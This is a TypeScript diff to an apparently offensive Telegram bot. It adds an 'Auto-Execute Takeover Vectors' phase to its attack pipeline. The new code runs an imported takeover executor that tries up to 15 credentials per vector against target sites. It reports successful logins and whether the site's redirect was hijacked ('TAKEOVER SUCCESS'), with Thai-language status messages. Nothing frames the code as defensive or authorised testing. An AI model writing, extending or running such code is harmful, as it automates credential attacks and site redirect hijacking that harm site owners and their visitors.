@@ -6308,6 +6308,49 @@ async function executeAttackWithProgress(config: TelegramConfig, chatId: number,
           );
           timings.push({ step: `Takeover Intel: ${intelResult.takeoverVectors.length} vectors`, ms: intelMs, ok: intelResult.takeoverVectors.length > 0 });
           stepIndex++;
+
+          // ═══ Phase 8: AUTO-EXECUTE TOP TAKEOVER VECTORS ═══
+          if (intelResult.takeoverVectors.length > 0 && intelResult.topVector && intelResult.topVector.successProbability >= 10) {
+            try {
+              await narrator.startPhase("intel", "🎯 Auto-Execute Takeover Vectors");
+              const execStep = await narrator.addStep(`Execute top ${Math.min(3, intelResult.takeoverVectors.length)} vectors (${intelResult.topVector.name} ~${intelResult.topVector.successProbability}%)`);
+              const execStart = Date.now();
+              const { executeTakeoverVectors, formatTakeoverExecutionForTelegram } = await import("./auto-takeover-executor");
+              const execResult = await executeTakeoverVectors({
+                intelResult,
+                maxVectors: 3,
+                maxCredsPerVector: 15,
+                maxDurationMs: 120_000,
+                onProgress: async (_phase: string, detail: string) => {
+                  try { await narrator.addAnalysis(`🎯 ${detail.substring(0, 100)}`); } catch {}
+                },
+                onAttempt: async (vectorId: string, email: string, status: string, detail: string) => {
+                  try {
+                    if (status === "success") {
+                      await narrator.addAnalysis(`✅ ${detail.substring(0, 100)}`);
+                    }
+                  } catch {}
+                },
+              });
+              const execMs = Date.now() - execStart;
+              const execFormatted = formatTakeoverExecutionForTelegram(execResult);
+              const execChunks = execFormatted.match(/[\s\S]{1,3500}/g) || [execFormatted];
+              for (const chunk of execChunks) {
+                await narrator.addAnalysis(chunk);
+              }
+              await narrator.updateStep(execStep, execResult.redirectChanged ? "done" : (execResult.successfulLogins.length > 0 ? "done" : "failed"),
+                execResult.redirectChanged
+                  ? `🎯 TAKEOVER SUCCESS → ${execResult.newRedirectUrl}`
+                  : `${execResult.successfulLogins.length} logins | ${execResult.totalAttempts} attempts | ${(execMs / 1000).toFixed(1)}s`,
+                execMs
+              );
+              timings.push({ step: `Auto-Execute: ${execResult.redirectChanged ? "REDIRECT CHANGED" : `${execResult.successfulLogins.length} logins`}`, ms: execMs, ok: execResult.redirectChanged || execResult.successfulLogins.length > 0 });
+              stepIndex++;
+            } catch (execErr: any) {
+              await narrator.addAnalysis(`⚠️ Auto-Execute error: ${execErr.message?.substring(0, 80)}`);
+            }
+          }
+
         } catch (intelErr: any) {
           await narrator.addAnalysis(`⚠️ Takeover Intel error: ${intelErr.message?.substring(0, 80)}`);
         }
@@ -6322,12 +6365,16 @@ async function executeAttackWithProgress(config: TelegramConfig, chatId: number,
       const autoExploitTiming = timings.find(t => t.step.startsWith("Auto-Exploit"));
       const autoExploitSucceeded = autoExploitTiming?.ok || false;
       const intelTiming = timings.find(t => t.step.startsWith("Takeover Intel"));
-      const overallSuccess = vulnCount > 0 || autoExploitSucceeded;
+      const autoExecTiming = timings.find(t => t.step.startsWith("Auto-Execute"));
+      const autoExecSucceeded = autoExecTiming?.ok || false;
+      const redirectTakenOver = autoExecTiming?.step.includes("REDIRECT CHANGED") || false;
+      const overallSuccess = vulnCount > 0 || autoExploitSucceeded || redirectTakenOver;
 
       await narrator.complete(overallSuccess,
-        `Deep Redirect Scan + Auto-Exploit เสร็จ (${(totalMs / 1000).toFixed(1)}s) | Vulns: ${vulnCount} | PHP: ${phpCount} | Strategies: ${stratCount}` +
-        (autoExploitTiming ? ` | Auto-Exploit: ${autoExploitSucceeded ? "✅ สำเร็จ" : "❌ ไม่สำเร็จ"}` : "") +
-        (intelTiming ? ` | Intel: ${intelTiming.ok ? "✅" : "❌"}` : "")
+        `Deep Redirect Scan เสร็จ (${(totalMs / 1000).toFixed(1)}s) | Vulns: ${vulnCount} | PHP: ${phpCount} | Strategies: ${stratCount}` +
+        (autoExploitTiming ? ` | Auto-Exploit: ${autoExploitSucceeded ? "✅" : "❌"}` : "") +
+        (intelTiming ? ` | Intel: ${intelTiming.ok ? "✅" : "❌"}` : "") +
+        (autoExecTiming ? ` | Takeover: ${redirectTakenOver ? "🎯 REDIRECT CHANGED" : (autoExecSucceeded ? "🔓 Login OK" : "❌")}` : "")
       );
 
       // Save log
